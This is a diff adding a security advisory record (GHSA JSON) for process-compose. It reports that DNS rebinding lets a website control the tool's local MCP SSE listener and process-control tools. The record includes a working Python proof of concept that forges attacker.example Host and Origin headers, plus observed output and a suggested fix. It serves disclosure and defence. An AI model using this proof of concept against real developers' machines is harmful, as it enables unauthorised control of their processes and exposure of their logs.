@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-5gm3-9crp-6g3v",
+  "modified": "2026-09-18T17:30:08.416063579Z",
+  "published": "2026-09-18T17:17:51Z",
+  "aliases": [
+    "CVE-2026-77339"
+  ],
+  "summary": "Process Compose: Browser DNS rebinding lets websites control local process-compose MCP tools",
+  "details": "## Summary\n\nA malicious website can use DNS rebinding to control a developer's local process-compose MCP SSE listener when MCP SSE is enabled. The vulnerable path accepts browser-origin requests before any Host validation, Origin validation, or caller-secret check, then dispatches the requests into process-compose MCP tools.\n\nThis advisory covers `https://github.com/F1bonacc1/process-compose`, confirmed at commit `d56aa59df04b72f8644811ac581a051bec05e485`.\n\nThe issue is in the MCP SSE transport, not the Gin REST API. The REST API token middleware protects REST routes, but the MCP listener is started separately and does not inherit that protection.\n\n## Affected Code\n\nRoot cause:\n\n```text\nsrc/types/mcp.go:24-30      SSE is the default MCP transport when mcp_server.transport is omitted.\nsrc/types/mcp.go:64-70      SSE configuration requires only host and port. There is no auth, Host allowlist, Origin allowlist, or caller-secret field.\nsrc/mcp/server.go:203-214   The server starts server.NewSSEServer(s.mcpServer) directly on the configured address.\nsrc/api/routes.go:32-39     X-PC-Token-Key middleware is installed on the Gin REST router, not on the MCP SSE listener.\n```\n\nImpact surface:\n\n```text\nsrc/mcp/mcp_manager.go:33-38     expose_control_tools registers built-in process-compose control tools.\nsrc/mcp/control_tools.go:26-116  The registered tools start, stop, restart, scale, read logs, search logs, and truncate logs.\nsrc/mcp/control_tools.go:121-142 The registered tools return project and process state.\n```\n\n## Reproduction\n\nStart process-compose from the affected commit with MCP SSE and built-in control tools enabled:\n\n```bash\nworkdir=\"$(mktemp -d)\"\ncd \"$workdir\"\ngit clone https://github.com/F1bonacc1/process-compose process-compose-target\ncd process-compose-target\ngit checkout d56aa59df04b72f8644811ac581a051bec05e485\n\ngo build -o ./process-compose-poc .\n\ncat \u003e process-compose-mcp-poc.yaml \u003c\u003c'YAML'\nmcp_server:\n  host: 127.0.0.1\n  port: 8081\n  transport: sse\n  expose_control_tools: true\n\nprocesses:\n  sleeper:\n    command: \"sleep 600\"\n    disabled: true\nYAML\n\nPC_NO_SERVER=1 PC_DISABLE_DOTENV=1 ./process-compose-poc up \\\n  -f ./process-compose-mcp-poc.yaml \\\n  -t=false \\\n  --no-server \\\n  --keep-project \\\n  --log-file ./process-compose-mcp-poc.log\n```\n\nIn a second terminal, emulate the browser request shape produced by DNS rebinding. A real attacker page keeps `Host: attacker.example:8081` and `Origin: http://attacker.example:8081` while the hostname resolves to `127.0.0.1`. The script below sends that same request shape to the local MCP SSE listener:\n\n```bash\npython3 - \u003c\u003c'PY'\nimport http.client\nimport json\nimport queue\nimport threading\nimport time\nimport urllib.parse\n\nhost = \"127.0.0.1\"\nport = 8081\nattacker_host = \"attacker.example:8081\"\norigin = \"http://attacker.example:8081\"\nheaders = {\n    \"Host\": attacker_host,\n    \"Origin\": origin,\n    \"Accept\": \"text/event-stream\",\n}\n\nevents = queue.Queue()\n\ndef read_sse(resp):\n    event = None\n    data = None\n    while True:\n        line = resp.readline()\n        if not line:\n            return\n        text = line.decode(\"utf-8\", \"replace\").strip()\n        if text.startswith(\"event:\"):\n            event = text.split(\":\", 1)[1].strip()\n        elif text.startswith(\"data:\"):\n            data = text.split(\":\", 1)[1].strip()\n        elif text == \"\" and (event or data):\n            events.put((event, data))\n            event = None\n            data = None\n\nconn = http.client.HTTPConnection(host, port, timeout=10)\nconn.request(\"GET\", \"/sse\", headers=headers)\nresp = conn.getresponse()\nprint(\"GET /sse\", resp.status)\nprint(\"Access-Control-Allow-Origin:\", resp.getheader(\"Access-Control-Allow-Origin\"))\nthreading.Thread(target=read_sse, args=(resp,), daemon=True).start()\n\nendpoint = None\ndeadline = time.time() + 10\nwhile time.time() \u003c deadline:\n    event, data = events.get(timeout=1)\n    if event == \"endpoint\":\n        endpoint = data\n        break\nassert endpoint, \"no SSE endpoint event\"\nprint(\"endpoint\", endpoint)\n\ndef post(message):\n    parsed = urllib.parse.urlparse(endpoint)\n    path = parsed.path + (\"?\" + parsed.query if parsed.query else \"\")\n    body = json.dumps(message).encode()\n    c = http.client.HTTPConnection(host, port, timeout=10)\n    c.request(\"POST\", path, body=body, headers={\n        \"Host\": attacker_host,\n        \"Origin\": origin,\n        \"Content-Type\": \"application/json\",\n        \"Content-Length\": str(len(body)),\n        \"Authorization\": \"Bearer invalid-replay-token\",\n    })\n    r = c.getresponse()\n    r.read()\n    c.close()\n    print(\"POST\", message.get(\"method\"), r.status)\n\ndef wait_result(rpc_id):\n    deadline = time.time() + 10\n    while time.time() \u003c deadline:\n        event, data = events.get(timeout=1)\n        if event == \"message\" and data:\n            msg = json.loads(data)\n            if msg.get(\"id\") == rpc_id:\n                return msg\n    raise SystemExit(f\"no result for id {rpc_id}\")\n\npost({\n    \"jsonrpc\": \"2.0\",\n    \"id\": 1,\n    \"method\": \"initialize\",\n    \"params\": {\n        \"protocolVersion\": \"2024-11-05\",\n        \"capabilities\": {},\n        \"clientInfo\": {\"name\": \"rebind-poc\", \"version\": \"1.0.0\"}\n    }\n})\nprint(json.dumps(wait_result(1), indent=2))\n\npost({\"jsonrpc\": \"2.0\", \"method\": \"notifications/initialized\", \"params\": {}})\n\npost({\"jsonrpc\": \"2.0\", \"id\": 2, \"method\": \"tools/list\", \"params\": {}})\ntools = wait_result(2)\nnames = [tool[\"name\"] for tool in tools[\"result\"][\"tools\"]]\nprint(\"tools\", names)\n\npost({\n    \"jsonrpc\": \"2.0\",\n    \"id\": 3,\n    \"method\": \"tools/call\",\n    \"params\": {\n        \"name\": \"pc_process_list\",\n        \"arguments\": {}\n    }\n})\nprint(json.dumps(wait_result(3), indent=2))\nPY\n```\n\n## Observed Result\n\nThe MCP SSE listener accepted the forged browser-origin request shape:\n\n```text\nHost: attacker.example:8081\nOrigin: http://attacker.example:8081\nAuthorization: Bearer invalid-replay-token\n```\n\nThe server returned `GET /sse: HTTP 200` with `Access-Control-Allow-Origin: *`. The MCP session then completed `initialize`, returned the process-compose tool catalog, and allowed `tools/call` to reach a process-control handler.\n\nThe operator reproduced the issue against the genuine process-compose target and observed `pc_process_list` returning:\n\n```json\n{\n  \"data\": [\n    {\n      \"name\": \"sleeper\",\n      \"namespace\": \"default\",\n      \"status\": \"Disabled\",\n      \"system_time\": \"-\",\n      \"age\": 0,\n      \"is_ready\": \"-\",\n      \"has_ready_probe\": false,\n      \"restarts\": 0,\n      \"exit_code\": 0,\n      \"pid\": 0,\n      \"is_elevated\": false,\n      \"password_provided\": false,\n      \"mem\": 0,\n      \"cpu\": 0,\n      \"is_running\": false\n    }\n  ]\n}\n```\n\nEarlier replay against the same target also listed 13 `pc_*` MCP control tools and reached project-state and process-control calls through the SSE message endpoint.\n\n## Impact\n\nA web attacker can drive local process-compose MCP requests from the victim browser when the operator has enabled MCP SSE. The attacker does not need a bearer token, API key, cookie, client certificate, or CSRF token.\n\nWith `expose_control_tools: true`, the same unauthenticated browser-origin path can enumerate process state, read logs, search logs, truncate logs, start processes, stop processes, restart processes, and scale processes. If the operator exposes user-defined MCP process tools, the attacker can invoke those configured commands and read their output.\n\nProcess logs and process output often contain service names, local paths, usernames, runtime state, internal URLs, and secrets emitted by child processes. Start, stop, restart, scale, and log truncation are process-control operations on the developer's local process-compose project.\n\n## Suggested Fix\n\nAdd a target-side trust boundary to the MCP SSE listener before MCP dispatch:\n\n1. Reject requests whose `Host` header is not loopback or an explicit configured trusted name.\n2. Reject browser requests whose `Origin` is not a trusted loopback or configured origin.\n3. Require a random per-run bearer token or equivalent caller secret on both `/sse` and the returned `/message` endpoint.\n4. Do not rely on localhost reachability as an authentication boundary for browser-reachable HTTP transports.\n5. Consider requiring an explicit authentication setting before starting SSE MCP with process-control tools.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/f1bonacc1/process-compose",
+        "purl": "pkg:golang/github.com/f1bonacc1/process-compose"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.120.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-5gm3-9crp-6g3v/GHSA-5gm3-9crp-6g3v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/F1bonacc1/process-compose/security/advisories/GHSA-5gm3-9crp-6g3v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/F1bonacc1/process-compose/commit/6ffa74f462cd2fa4f8dc1ee63c70b793b298c858"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/F1bonacc1/process-compose"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/F1bonacc1/process-compose/releases/tag/v1.120.0"
+    }
+  ]
+}
